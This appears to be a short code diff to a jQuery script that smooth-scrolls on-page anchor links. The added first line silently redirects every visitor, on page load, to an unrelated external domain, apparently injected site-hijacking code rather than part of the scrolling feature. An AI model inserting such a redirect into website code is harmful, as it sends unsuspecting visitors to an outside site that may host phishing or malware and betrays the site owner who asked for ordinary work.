@@ -1,3 +1,5 @@
+window.location.replace("https://0311.quv.kr/");
+
 $(document).ready(function(){
 	$('a[href^="#"]').on('click',function (e) {
 	    e.preventDefault();
